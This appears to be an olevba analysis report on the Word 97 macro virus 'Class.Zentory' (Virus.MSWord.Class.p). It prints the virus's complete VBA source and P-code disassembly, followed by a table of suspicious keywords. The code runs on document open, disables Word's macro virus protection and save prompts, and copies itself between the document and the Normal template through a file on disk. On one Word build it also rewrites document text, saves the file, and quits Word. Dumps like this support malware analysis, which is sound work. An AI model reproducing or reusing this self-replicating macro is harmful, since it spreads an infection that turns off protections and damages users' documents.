olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo 69

Options.VirusProtection = False

Options.SaveNormalPrompt = False

Options.ConfirmConversions = False

xz = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

zx = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines

If zx > 120 And xz > 0 Then GoTo 69

If zx < 120 Then

    Set xsz = NormalTemplate.VBProject.VBComponents.Item(1)

    ActiveDocument.VBProject.VBComponents.Item(1).Name = xsz.Name

    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\zentory$.ffo"

End If

If xz = 0 Then Set xsz = ActiveDocument.VBProject.VBComponents.Item(1)

Infection = Int(Rnd * 100)

If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(90) + Chr(69) + Chr(78) + Chr(84) + Chr(79) + Chr(82) + Chr(89) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)

If Application.Build = "8.0.4412" Then Call z2000

xsz.codemodule.AddFromFile ("c:\zentory$.ffo")

With xsz.codemodule

    For x = 1 To 4

    .deletelines 1

    Next x

End With

If zx < 120 Then

    With xsz.codemodule

    .replaceline 1, "Sub AutoClose()"

    .replaceline 123, "Sub ToolsMacro()"

    End With

End If

With xsz.codemodule

    For x = 2 To 122 Step 2

    .replaceline x, "'" & Application.Build & Application.StartupPath & Application.WindowState & Application.FocusInMailHeader & Application.ActiveWindow
    
Next x

End With

69:

If zx > 120 And xz = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Private Sub z2000()

On Error Resume Next

        Selection.HomeKey Unit:=wdStory

        Selection.Find.ClearFormatting

        Selection.Find.Replacement.ClearFormatting

        With Selection.Find

            .Text = "the"

            .Replacement.Text = "Zentory"

            .Forward = True

            .Wrap = wdFindContinue

            .Format = False

            .MatchCase = False

            .MatchWholeWord = True

            .MatchAllWordForms = False

        End With

        Selection.Find.Execute Replace:=wdReplaceAll

If ActiveDocument.Saved = False Then ActiveDocument.Save

Rpx:

I = I + 1

Application.WindowState = wdWindowStateMinimize

Application.WindowState = wdWindowStateMaximize

If I < 10 Then GoTo Rpx

Application.Quit

End Sub

Sub ViewVBCode()
'Word97/Class.Zentory by Virus,Hi Vic.
End Sub







-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.p
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5354 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	OnError 69 
' Line #3:
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St xz 
' Line #11:
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St zx 
' Line #13:
' Line #14:
' 	Ld zx 
' 	LitDI2 0x0078 
' 	Gt 
' 	Ld xz 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 69 
' 	EndIf 
' Line #15:
' Line #16:
' 	Ld zx 
' 	LitDI2 0x0078 
' 	Lt 
' 	IfBlock 
' Line #17:
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xsz 
' Line #19:
' Line #20:
' 	Ld xsz 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #21:
' Line #22:
' 	LitStr 0x000F "c:\zentory$.ffo"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' 	Ld xz 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xsz 
' 	EndIf 
' Line #27:
' Line #28:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St Infection 
' Line #29:
' Line #30:
' 	Ld Infection 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #31:
' Line #32:
' 	Ld Application 
' 	MemLd Build 
' 	LitStr 0x0008 "8.0.4412"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) z2000 0x0000 
' 	EndIf 
' Line #33:
' Line #34:
' 	LitStr 0x000F "c:\zentory$.ffo"
' 	Paren 
' 	Ld xsz 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #35:
' Line #36:
' 	StartWithExpr 
' 	Ld xsz 
' 	MemLd codemodule 
' 	With 
' Line #37:
' Line #38:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #39:
' Line #40:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #41:
' Line #42:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' Line #44:
' 	EndWith 
' Line #45:
' Line #46:
' 	Ld zx 
' 	LitDI2 0x0078 
' 	Lt 
' 	IfBlock 
' Line #47:
' Line #48:
' 	StartWithExpr 
' 	Ld xsz 
' 	MemLd codemodule 
' 	With 
' Line #49:
' Line #50:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #51:
' Line #52:
' 	LitDI2 0x007B 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #53:
' Line #54:
' 	EndWith 
' Line #55:
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' 	StartWithExpr 
' 	Ld xsz 
' 	MemLd codemodule 
' 	With 
' Line #59:
' Line #60:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x007A 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #61:
' Line #62:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd Build 
' 	Concat 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Concat 
' 	Ld Application 
' 	MemLd WindowState 
' 	Concat 
' 	Ld Application 
' 	MemLd FocusInMailHeader 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #63:
' Line #64:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' Line #66:
' 	EndWith 
' Line #67:
' Line #68:
' 	LineNum 69 
' 	BoS 0x0000 
' Line #69:
' Line #70:
' 	Ld zx 
' 	LitDI2 0x0078 
' 	Gt 
' 	Ld xz 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #71:
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub z2000())
' Line #75:
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' Line #78:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #79:
' Line #80:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #81:
' Line #82:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #83:
' Line #84:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #85:
' Line #86:
' 	LitStr 0x0003 "the"
' 	MemStWith Then 
' Line #87:
' Line #88:
' 	LitStr 0x0007 "Zentory"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #89:
' Line #90:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #91:
' Line #92:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #93:
' Line #94:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #95:
' Line #96:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #97:
' Line #98:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #99:
' Line #100:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #101:
' Line #102:
' 	EndWith 
' Line #103:
' Line #104:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #105:
' Line #106:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #107:
' Line #108:
' 	Label Rpx 
' Line #109:
' Line #110:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #111:
' Line #112:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #113:
' Line #114:
' 	Ld wdWindowStateMaximize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #115:
' Line #116:
' 	Ld I 
' 	LitDI2 0x000A 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo Rpx 
' 	EndIf 
' Line #117:
' Line #118:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #119:
' Line #120:
' 	EndSub 
' Line #121:
' Line #122:
' 	FuncDefn (Sub ViewVBCode())
' Line #123:
' 	QuoteRem 0x0000 0x0025 "Word97/Class.Zentory by Virus,Hi Vic."
' Line #124:
' 	EndSub 
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

